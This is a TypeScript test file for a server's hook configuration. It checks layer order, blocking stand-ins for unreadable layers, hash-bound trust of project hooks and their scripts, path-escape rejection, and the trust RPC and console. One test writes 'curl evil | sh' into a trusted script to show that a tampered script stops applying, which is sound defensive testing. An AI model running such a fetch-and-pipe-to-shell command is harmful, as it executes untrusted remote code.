// Hook configuration (7F plan Task 2; Decisions 5–8; spec §9.3, §9.4): the five layers in
// order, an unreadable layer standing as a blocking hook, project hooks applying only while
// their file is the trusted one (re-checked at every read, no restart), trust with
// `hooksHash` bound to what the person saw, `agent.hooks.list`, the start warning and the
// console's `project trust`.
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { ListedHook } from "@finisher/contracts";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "vitest";
import type { FakeScript } from "../src/agent/fake.ts";
import type { ProjectTrust } from "../src/agent/rule-store.ts";
import { hashOf } from "../src/agent/trust.ts";
import { runConsole } from "../src/console/main.ts";
import { HOOKS_FILE, HookConfig, hooksHashOf, type PluginHookRow } from "../src/hooks/config.ts";
import { AgentServer, code, open } from "./support/agent-server.ts";
import { addAsset, commit, confirmed, type NdjsonClient, ok, tx } from "./support/ndjson-client.ts";
import { person } from "./support/person.ts";

let tmp: string;
const hooksEnv = process.env.FIN_TEST_HOOKS;
beforeAll(() => {
  process.env.FIN_TEST_HOOKS = "1";
});
afterAll(() => {
  if (hooksEnv === undefined) delete process.env.FIN_TEST_HOOKS;
  else process.env.FIN_TEST_HOOKS = hooksEnv;
});
beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), "finisherd-hooks-config-"));
});
afterEach(() => {
  rmSync(tmp, { recursive: true, force: true });
});

const hook = (id: string, event = "PreCommand", more: Record<string, unknown> = {}) => ({ id, event, run: ["node", "fake-hook.mjs"], ...more });
const writeJson = (path: string, value: unknown) => writeFileSync(path, JSON.stringify(value));
const writeHooks = (dir: string, hooks: unknown[]) => writeJson(join(dir, HOOKS_FILE), { hooks });
/** The `hooksHash` of a hooks file that references no project file. */
const fileHash = (dir: string) => hooksHashOf(hashOf(readFileSync(join(dir, HOOKS_FILE))), []);

/** A config over `tmp`: one project `p1` in `tmp/P`, its trust record in a map. */
function fixture(plugins: readonly PluginHookRow[] = []) {
  const serverData = join(tmp, "server-data");
  const dir = join(tmp, "P");
  mkdirSync(serverData, { recursive: true });
  mkdirSync(dir, { recursive: true });
  const trusts = new Map<string, ProjectTrust>();
  const config = new HookConfig({ serverData, trustOf: (id) => trusts.get(id), dirOf: (id) => (id === "p1" ? dir : undefined), plugins: () => plugins });
  const trustHooks = (hooksHash: string | undefined) =>
    trusts.set("p1", { projectId: "p1", rulesHash: "none", ...(hooksHash === undefined ? {} : { hooksHash }), trustedAt: 0, by: "console:owner" });
  const ids = () => config.hooks("p1").map((h) => `${h.layer}:${h.id}`);
  return { serverData, dir, config, trustHooks, ids };
}

describe("layers", () => {
  test("layers_in_order: managed, user, project, local, then plugin rows (by plugin id, then their order)", () => {
    const plugins: PluginHookRow[] = [
      { plugin: "@b/two", event: "JobDone", handler: "b1" },
      { plugin: "@a/one", event: "PreCommand", handler: "a1" },
      { plugin: "@a/one", event: "SessionEnd", handler: "a2" },
    ];
    const { serverData, dir, config, trustHooks, ids } = fixture(plugins);
    writeJson(join(serverData, "managed-settings.json"), { hooks: [hook("m1"), hook("m2", "SessionEnd")] });
    writeJson(join(serverData, "settings.json"), { fonts: { autoFetch: true }, hooks: [hook("u1")] });
    writeHooks(dir, [hook("p1")]);
    trustHooks(fileHash(dir));
    mkdirSync(join(serverData, "projects", "p1"), { recursive: true });
    writeJson(join(serverData, "projects", "p1", "hooks.json"), { hooks: [hook("l1")] });
    expect(ids()).toEqual(["managed:m1", "managed:m2", "user:u1", "project:p1", "local:l1", "plugin:a1", "plugin:a2", "plugin:b1"]);
    const listed = config.list("p1").hooks;
    expect(listed.map((h) => [h.layer, h.id, h.applies])).toEqual([
      ["managed", "m1", true],
      ["managed", "m2", true],
      ["user", "u1", true],
      ["project", "p1", true],
      ["local", "l1", true],
      ["plugin", "a1", true],
      ["plugin", "a2", true],
      ["plugin", "b1", true],
    ]);
    expect(listed.find((h) => h.id === "a1")).toMatchObject({ source: "@a/one", plugin: "@a/one", event: "PreCommand" });
    expect(listed.find((h) => h.id === "p1")).toMatchObject({ source: HOOKS_FILE, run: ["node", "fake-hook.mjs"] });
    // Without a project: the server's layers and the plugins only.
    expect(config.list(undefined).hooks.map((h) => h.id)).toEqual(["m1", "m2", "u1", "a1", "a2", "b1"]);
  });

  test("no_file_is_no_hooks: no file, or no hooks key, is no hooks", () => {
    const { serverData, config, ids } = fixture();
    expect(ids()).toEqual([]);
    writeJson(join(serverData, "settings.json"), { fonts: { autoFetch: true } });
    writeJson(join(serverData, "managed-settings.json"), { agents: { rules: [] } });
    expect(ids()).toEqual([]);
    expect(config.list("p1")).toMatchObject({ hooks: [], projectHooks: "none", hooksHash: "none" });
  });

  test("unreadable_user_layer_stands_as_blocking_hook (and listed)", () => {
    const { serverData, config, ids } = fixture();
    writeFileSync(join(serverData, "settings.json"), JSON.stringify({ hooks: [hook("ok"), { id: "bad", event: "PreCommand", run: ["node"], net: true }] }));
    // One synthetic hook per event whose block refuses an action.
    expect(ids()).toEqual(["user:user.unreadable", "user:user.unreadable", "user:user.unreadable", "user:user.unreadable", "user:user.unreadable"]);
    const synthetic = config.hooks("p1");
    expect(synthetic.map((h) => h.event).sort()).toEqual(["BranchReady", "PreCommand", "PreMerge", "PreRender", "UserPrompt"]);
    expect(synthetic.every((h) => h.unreadable === true && h.run === undefined)).toBe(true);
    const listed = config.list(undefined).hooks;
    expect(listed.filter((h) => h.id === "user.unreadable" && h.applies)).toHaveLength(5);
    expect(listed.find((h) => h.event === "PreRender")).toMatchObject({ inert: "noRenderKind" });
    // Not JSON at all, a hooks key that is not a list, a duplicate id: unreadable too.
    for (const text of ["{ nope", JSON.stringify({ hooks: {} }), JSON.stringify({ hooks: [hook("a"), hook("a")] })]) {
      writeFileSync(join(serverData, "settings.json"), text);
      expect(config.hooks(undefined).map((h) => h.id)).toContain("user.unreadable");
    }
    // More than 64 hooks in a file.
    writeJson(join(serverData, "settings.json"), { hooks: Array.from({ length: 65 }, (_, i) => hook(`h${i}`)) });
    expect(config.hooks(undefined).every((h) => h.id === "user.unreadable")).toBe(true);
    // The managed layer and the local layer stand the same way.
    writeJson(join(serverData, "settings.json"), {});
    writeFileSync(join(serverData, "managed-settings.json"), "[]");
    mkdirSync(join(serverData, "projects", "p1"), { recursive: true });
    writeFileSync(join(serverData, "projects", "p1", "hooks.json"), "{");
    expect([...new Set(ids())]).toEqual(["managed:managed.unreadable", "local:local.unreadable"]);
  });

  test("run_relative_to_declaring_file: run[0] and file with a separator resolve in the declaring file's folder", () => {
    const { serverData, dir, config, trustHooks } = fixture();
    const abs = join(tmp, "elsewhere", "check");
    writeHooks(dir, [
      hook("script", "PreCommand", { run: ["./bin/check", "--x", "a b"] }),
      hook("node", "PreCommand", { run: ["node", "fake-hook.mjs"], file: "fake-hook.mjs" }),
      hook("abs", "PreCommand", { run: [abs], file: "sub/data.json" }),
    ]);
    // The project files the hooks name exist (the trusted hash binds them).
    for (const f of ["bin/check", "fake-hook.mjs", "sub/data.json"]) {
      mkdirSync(join(dir, f, ".."), { recursive: true });
      writeFileSync(join(dir, f), f);
    }
    trustHooks(config.project("p1").hooksHash);
    writeJson(join(serverData, "settings.json"), { hooks: [hook("user", "PreCommand", { run: ["hooks/u.sh"] })] });
    const by = new Map(config.hooks("p1").map((h) => [h.id, h]));
    // A path with a separator is the declaring folder's; with no `file`, it is the hook's own file.
    expect(by.get("script")).toMatchObject({ run: [join(dir, "bin", "check"), "--x", "a b"], file: join(dir, "bin", "check"), dir });
    // A bare name stays as written (resolved when it runs); `file` is the declaring folder's.
    expect(by.get("node")).toMatchObject({ run: ["node", "fake-hook.mjs"], file: join(dir, "fake-hook.mjs") });
    // An absolute program is kept, and is not the hook's own file.
    expect(by.get("abs")).toMatchObject({ run: [abs], file: join(dir, "sub", "data.json") });
    expect(by.get("user")).toMatchObject({ run: [join(serverData, "hooks", "u.sh")], file: join(serverData, "hooks", "u.sh"), dir: serverData });
  });
});

test("a project id that is not a folder name reads no local layer", () => {
  const { serverData, config } = fixture();
  mkdirSync(join(serverData, "x"), { recursive: true });
  writeJson(join(serverData, "x", "hooks.json"), { hooks: [hook("sneaky")] });
  mkdirSync(join(serverData, "projects"), { recursive: true });
  expect(config.hooks("../x")).toEqual([]);
  expect(config.list("../x").hooks).toEqual([]);
});

describe("project files a hook names (review of Task 2)", () => {
  /** `P/hooks/check.mjs` named by `file`, `P/hooks/run.sh` as the program, one absolute program outside. */
  function scripted() {
    const f = fixture();
    mkdirSync(join(f.dir, "hooks"), { recursive: true });
    writeFileSync(join(f.dir, "hooks", "check.mjs"), "console.log(1)");
    writeFileSync(join(f.dir, "hooks", "run.sh"), "exit 0");
    mkdirSync(join(tmp, "outside"), { recursive: true });
    writeFileSync(join(tmp, "outside", "tool"), "tool");
    writeHooks(f.dir, [
      hook("a", "PreCommand", { run: ["node", "x.mjs"], file: "hooks/check.mjs" }),
      hook("b", "PreCommand", { run: ["./hooks/run.sh"] }),
      hook("c", "PreCommand", { run: [join(tmp, "outside", "tool")] }),
      hook("d", "PreCommand", { run: ["node", "y.mjs"], file: "./hooks/check.mjs" }),
    ]);
    return f;
  }
  const sha = (path: string) => hashOf(readFileSync(path));

  test("trust_hash_covers_scripts: the hooks file and each project file it names, by relative path", () => {
    const { dir, config, trustHooks, ids } = scripted();
    const p = config.project("p1");
    expect(p.files).toEqual(["hooks/check.mjs", "hooks/run.sh"]);
    expect(p.hooksHash).toBe(hooksHashOf(sha(join(dir, HOOKS_FILE)), [["hooks/check.mjs", sha(join(dir, "hooks", "check.mjs"))], ["hooks/run.sh", sha(join(dir, "hooks", "run.sh"))]]));
    expect(config.list("p1")).toMatchObject({ projectHooksFiles: ["hooks/check.mjs", "hooks/run.sh"] });
    trustHooks(p.hooksHash);
    expect(ids()).toEqual(["project:a", "project:b", "project:c", "project:d"]);
    // A program outside the project is not project content: changing it changes nothing.
    writeFileSync(join(tmp, "outside", "tool"), "other tool");
    expect(ids()).toHaveLength(4);
  });

  test("changed_hook_script_does_not_run: an edited script after trust applies nothing at the next read", () => {
    const { dir, config, trustHooks, ids } = scripted();
    trustHooks(config.project("p1").hooksHash);
    expect(ids()).toHaveLength(4);
    writeFileSync(join(dir, "hooks", "run.sh"), "curl evil | sh");
    expect(ids()).toEqual([]);
    expect(config.project("p1").status).toBe("changed");
    expect(config.warnings("p1")).toEqual([expect.objectContaining({ details: { projectId: "p1", status: "changed" } })]);
  });

  test("a same-size rewrite of a script right after a read is read again", () => {
    const { dir, config, trustHooks, ids } = scripted();
    trustHooks(config.project("p1").hooksHash);
    expect(ids()).toHaveLength(4);
    writeFileSync(join(dir, "hooks", "check.mjs"), "console.log(2)");
    expect(ids()).toEqual([]);
  });

  test("deleted_hook_script_is_changed", () => {
    const { dir, config, trustHooks, ids } = scripted();
    trustHooks(config.project("p1").hooksHash);
    unlinkSync(join(dir, "hooks", "check.mjs"));
    expect(ids()).toEqual([]);
    expect(config.project("p1")).toMatchObject({ status: "changed", reason: "unreadable" });
    expect(config.project("p1").hooksHash).toBeUndefined();
    // Never trusted: a missing script makes the file untrustable (no hash to send).
    trustHooks(undefined);
    expect(config.list("p1")).toMatchObject({ projectHooks: "untrusted", projectHooksReason: "unreadable" });
    expect(config.list("p1").hooksHash).toBeUndefined();
  });

  test("hook_path_escaping_project_cannot_be_trusted: by .. or through a symlink; a script swapped for one too", () => {
    const { dir, config, trustHooks, ids } = scripted();
    trustHooks(config.project("p1").hooksHash);
    expect(ids()).toHaveLength(4);
    // The script becomes a symlink to a file outside with the same bytes: no longer the project's.
    writeFileSync(join(tmp, "outside", "check.mjs"), "console.log(1)");
    unlinkSync(join(dir, "hooks", "check.mjs"));
    symlinkSync(join(tmp, "outside", "check.mjs"), join(dir, "hooks", "check.mjs"));
    expect(ids()).toEqual([]);
    expect(config.project("p1")).toMatchObject({ status: "changed", reason: "invalidHooks" });
    // `..` out of the project.
    writeHooks(dir, [hook("e", "PreCommand", { run: ["node", "x.mjs"], file: "../outside/tool" })]);
    expect(config.list("p1")).toMatchObject({ projectHooks: "changed", projectHooksReason: "invalidHooks" });
    expect(config.list("p1").hooksHash).toBeUndefined();
    expect(config.project("p1").invalid).toContain("../outside/tool");
  });
});

describe("project trust of hooks", () => {
  test("project_hooks_untrusted_do_not_apply: listed, not applying, with the hash to trust", () => {
    const { dir, config, trustHooks, ids } = fixture();
    writeHooks(dir, [hook("p1")]);
    expect(ids()).toEqual([]);
    expect(config.list("p1")).toMatchObject({ projectHooks: "untrusted", hooksHash: fileHash(dir), hooks: [{ layer: "project", id: "p1", applies: false }] });
    // A trust record for the rules alone does not trust the hooks.
    trustHooks(undefined);
    expect(ids()).toEqual([]);
    expect(config.project("p1").status).toBe("untrusted");
    trustHooks(fileHash(dir));
    expect(ids()).toEqual(["project:p1"]);
    expect(config.project("p1").status).toBe("trusted");
  });

  test("changed_project_hooks_do_not_run: an edit after trusting applies nothing at the next read", () => {
    const { dir, config, trustHooks, ids } = fixture();
    writeHooks(dir, [hook("p1")]);
    trustHooks(fileHash(dir));
    expect(ids()).toEqual(["project:p1"]);
    writeHooks(dir, [hook("p1"), hook("p2")]);
    expect(ids()).toEqual([]);
    expect(config.list("p1")).toMatchObject({ projectHooks: "changed", hooksHash: fileHash(dir) });
    expect(config.list("p1").hooks.map((h) => [h.id, h.applies])).toEqual([["p1", false], ["p2", false]]);
    expect(config.warnings("p1")).toEqual([expect.objectContaining({ code: "PROJECT_HOOKS_UNTRUSTED", details: { projectId: "p1", status: "changed" } })]);
  });

  test("change_within_a_second_is_seen: a same-size rewrite right after a read is read again", () => {
    const { dir, trustHooks, ids } = fixture();
    writeHooks(dir, [hook("aa")]);
    trustHooks(fileHash(dir));
    // Primes whatever is kept of the file.
    expect(ids()).toEqual(["project:aa"]);
    const before = readFileSync(join(dir, HOOKS_FILE)).length;
    writeHooks(dir, [hook("bb")]);
    expect(readFileSync(join(dir, HOOKS_FILE)).length).toBe(before);
    expect(ids()).toEqual([]);
  });

  test("deleted_trusted_file_is_changed; an unreadable one too; a trusted `none` and a new file is changed", () => {
    const { dir, config, trustHooks, ids } = fixture();
    writeHooks(dir, [hook("p1")]);
    trustHooks(fileHash(dir));
    unlinkSync(join(dir, HOOKS_FILE));
    expect(ids()).toEqual([]);
    expect(config.project("p1")).toMatchObject({ status: "changed", reason: "deleted", hooksHash: "none" });
    mkdirSync(join(dir, HOOKS_FILE));
    expect(config.project("p1")).toMatchObject({ status: "changed", reason: "unreadable" });
    rmSync(join(dir, HOOKS_FILE), { recursive: true });
    trustHooks("none");
    expect(config.project("p1").status).toBe("none");
    expect(config.warnings("p1")).toEqual([]);
    writeHooks(dir, [hook("p1")]);
    expect(config.project("p1").status).toBe("changed");
    expect(ids()).toEqual([]);
  });
});

// Over a real server: the trust RPC, the listing, the start warning and the console.
describe("over RPC", () => {
  let server: AgentServer;
  const SCRIPT: FakeScript = { name: "main", turns: [[{ emit: [{ type: "turnCompleted", stopReason: "endTurn" }] }]] };
  beforeEach(() => {
    const serverData = join(tmp, "server-data");
    mkdirSync(serverData, { recursive: true, mode: 0o700 });
    server = new AgentServer(serverData, { timers: false, fakeScripts: [SCRIPT] });
  });
  afterEach(async () => {
    await server.stop();
  });

  async function setUp() {
    await server.start();
    const local = await server.local();
    const dir = join(tmp, "P");
    const projectId = ok<{ projectId: string }>(await local.call("project.create", { dir, name: "P", rate: "30" })).projectId;
    ok(await commit(local, projectId, tx("01aaaaaaaaaaaaaaaaaaaaaaa0", 0, [addAsset()])));
    const owner = await server.console();
    return { local, owner, projectId, dir };
  }
  type Listing = { hooks: ListedHook[]; projectHooks?: string; hooksHash?: string; projectHooksReason?: string };
  const list = async (c: NdjsonClient, projectId?: string) => ok<Listing>(await c.call("agent.hooks.list", projectId === undefined ? {} : { projectId }));
  const rulesHashOf = async (c: NdjsonClient, projectId: string) => ok<{ rulesHash: string }>(await c.call("agent.rules.list", { projectId })).rulesHash;

  test("trust_records_hooks_hash: answered and audited with it; the hooks apply", async () => {
    const { owner, projectId, dir } = await setUp();
    writeHooks(dir, [hook("p1")]);
    const seen = await list(owner, projectId);
    expect(seen).toMatchObject({ projectHooks: "untrusted", hooksHash: fileHash(dir) });
    const trusted = ok<{ hooksHash?: string }>(await confirmed(owner, "agent.project.trust", { projectId, expectedHash: await rulesHashOf(owner, projectId), expectedHooksHash: seen.hooksHash }));
    expect(trusted.hooksHash).toBe(seen.hooksHash);
    expect(server.agents.ruleStore.trustOf(projectId)?.hooksHash).toBe(seen.hooksHash);
    expect(await list(owner, projectId)).toMatchObject({ projectHooks: "trusted", hooks: [{ id: "p1", applies: true }] });
    const { entries } = ok<{ entries: Array<{ kind: string; details: Record<string, unknown> }> }>(await owner.call("auth.audit.list", {}));
    expect(entries.find((x) => x.kind === "agent.project.trust")?.details).toEqual({ rpc: "agent.project.trust", projectId, rulesHash: "none", hooksHash: seen.hooksHash });
  });

  test("trust_binds_what_was_shown: a stale expectedHooksHash changes nothing (rules and prompts untouched)", async () => {
    const { owner, projectId, dir } = await setUp();
    writeHooks(dir, [hook("p1")]);
    const seen = (await list(owner, projectId)).hooksHash;
    writeHooks(dir, [hook("p1", "SessionEnd")]);
    const e = await confirmed(owner, "agent.project.trust", { projectId, expectedHash: "none", expectedHooksHash: seen, expectedPromptsHash: "none" });
    expect(e.ok ? undefined : [e.error.code, e.error.details]).toEqual(["INVALID_REQUEST", expect.objectContaining({ field: "expectedHooksHash", reason: "changed", hooksHash: fileHash(dir) })]);
    // Nothing was recorded: no trust row at all.
    expect(server.agents.ruleStore.trustOf(projectId)).toBeUndefined();
    expect((await list(owner, projectId)).projectHooks).toBe("untrusted");
  });

  test("trust_without_hooks_field_keeps_hooks_untrusted", async () => {
    const { owner, projectId, dir } = await setUp();
    writeHooks(dir, [hook("p1")]);
    const r = ok<Record<string, unknown>>(await confirmed(owner, "agent.project.trust", { projectId, expectedHash: "none" }));
    expect(r.hooksHash).toBeUndefined();
    expect(server.agents.ruleStore.trustOf(projectId)).toMatchObject({ rulesHash: "none" });
    expect(server.agents.ruleStore.trustOf(projectId)?.hooksHash).toBeUndefined();
    expect(await list(owner, projectId)).toMatchObject({ projectHooks: "untrusted", hooks: [{ id: "p1", applies: false }] });
  });

  test("invalid_hooks_file_cannot_be_trusted", async () => {
    const { owner, projectId, dir } = await setUp();
    writeHooks(dir, [hook("p1"), { id: "p2", event: "SessionStart", run: ["node"], match: "x" }]);
    const listed = await list(owner, projectId);
    expect(listed).toMatchObject({ projectHooks: "untrusted", projectHooksReason: "invalidHooks", hooks: [] });
    const e = await confirmed(owner, "agent.project.trust", { projectId, expectedHash: "none", expectedHooksHash: listed.hooksHash });
    expect(e.ok ? undefined : [e.error.code, (e.error.details as { reason?: string }).reason]).toEqual(["INVALID_REQUEST", "invalidHooks"]);
    expect(e.ok ? "" : e.error.message).toContain("p2");
    expect(server.agents.ruleStore.trustOf(projectId)).toBeUndefined();
    // Not JSON: unreadable as hooks, not trustable either.
    writeFileSync(join(dir, HOOKS_FILE), "{ nope");
    const again = await list(owner, projectId);
    expect(code(await confirmed(owner, "agent.project.trust", { projectId, expectedHash: "none", expectedHooksHash: again.hooksHash }))).toBe("INVALID_REQUEST");
  });

  test("hook_path_escaping_project_cannot_be_trusted over RPC", async () => {
    const { owner, projectId, dir } = await setUp();
    writeHooks(dir, [hook("e", "PreCommand", { run: ["../elsewhere/run"] })]);
    const listed = await list(owner, projectId);
    expect(listed).toMatchObject({ projectHooks: "untrusted", projectHooksReason: "invalidHooks" });
    expect(listed.hooksHash).toBeUndefined();
    const e = await confirmed(owner, "agent.project.trust", { projectId, expectedHash: "none", expectedHooksHash: fileHash(dir) });
    expect(e.ok ? undefined : [e.error.code, (e.error.details as { reason?: string }).reason]).toEqual(["INVALID_REQUEST", "invalidHooks"]);
    expect(server.agents.ruleStore.trustOf(projectId)).toBeUndefined();
  });

  test("hooks_list_is_people_only: an agent's or local's call is SCOPE_DENIED", async () => {
    const { local, owner, projectId } = await setUp();
    expect((await list(owner, projectId)).hooks).toEqual([]);
    expect((await list(owner)).hooks).toEqual([]);
    const e = await local.call("agent.hooks.list", { projectId });
    expect(e.ok ? undefined : [e.error.code, (e.error.details as { reason?: string }).reason]).toEqual(["SCOPE_DENIED", "principalKind"]);
    const opened = await open(server.core, local, projectId);
    const a = await server.agent(opened.credentialPath);
    expect(code(await a.call("agent.hooks.list", { projectId }))).toBe("SCOPE_DENIED");
    expect(code(await owner.call("agent.hooks.list", { projectId: "01NOPE0000000000000000000A" }))).toBe("PROJECT_NOT_FOUND");
  });

  test("start_warns_untrusted_hooks: a hooks file that does not apply is a warning on the start", async () => {
    const { local, owner, projectId, dir } = await setUp();
    const start = async () => ok<{ warnings?: Array<{ code: string; details: Record<string, unknown> }> }>(await local.call("agent.session.start", { projectId, harness: "fake" }));
    const hookWarnings = async () => ((await start()).warnings ?? []).filter((w) => w.code === "PROJECT_HOOKS_UNTRUSTED");
    expect(await hookWarnings()).toEqual([]);
    writeHooks(dir, [hook("p1")]);
    expect((await hookWarnings()).map((w) => w.details)).toEqual([{ projectId, status: "untrusted" }]);
    ok(await confirmed(owner, "agent.project.trust", { projectId, expectedHash: "none", expectedHooksHash: fileHash(dir) }));
    expect(await hookWarnings()).toEqual([]);
    writeHooks(dir, [hook("p2")]);
    expect((await hookWarnings()).map((w) => w.details)).toEqual([{ projectId, status: "changed" }]);
  });

  test("console_trust_shows_hooks_and_sends_hash", async () => {
    const { owner, projectId, dir } = await setUp();
    mkdirSync(join(dir, "hooks"), { recursive: true });
    writeFileSync(join(dir, "hooks", "lint.mjs"), "process.exit(0)");
    writeHooks(dir, [
      hook("lint", "PreCommand", { run: ["node", "fake-hook.mjs", "--reply", "allow"], match: "item.*", file: "hooks/lint.mjs", principals: "all", fin: true, onTimeout: "block", timeoutS: 30 }),
    ]);
    const { hooksHash } = await list(owner, projectId);
    const p = person();
    let out = "";
    const exit = await runConsole(["project", "trust", projectId, "--server-data", server.serverData], { prompt: p, output: { out: (t) => void (out += `${t}\n`), err: () => undefined } });
    expect(exit).toBe(0);
    expect(p.shown.some((t) => t.includes("lint") && t.includes("PreCommand") && t.includes("fake-hook.mjs") && t.includes("--reply"))).toBe(true);
    expect(p.shown.some((t) => t.includes(HOOKS_FILE))).toBe(true);
    // What makes a hook dangerous is shown: everyone's calls, a `fin` credential, its own file, its failure answer.
    const line = p.shown.find((t) => t.startsWith("lint"))!;
    for (const part of ["principals all", "fin", "file hooks/lint.mjs", "onTimeout block", "timeout 30s"]) expect(line).toContain(part);
    // The trusted hash binds the script too, and the person is told which files it binds.
    expect(p.shown.some((t) => t.includes("hooks/lint.mjs") && t.includes("binds"))).toBe(true);
    expect(hooksHash).toBe(hooksHashOf(hashOf(readFileSync(join(dir, HOOKS_FILE))), [["hooks/lint.mjs", hashOf(readFileSync(join(dir, "hooks", "lint.mjs")))]]));
    expect(out).toContain(`hooks ${hooksHash}`);
    expect(server.agents.ruleStore.trustOf(projectId)?.hooksHash).toBe(hooksHash);
    expect(await list(owner, projectId)).toMatchObject({ projectHooks: "trusted", hooks: [{ id: "lint", applies: true }] });
  });
});
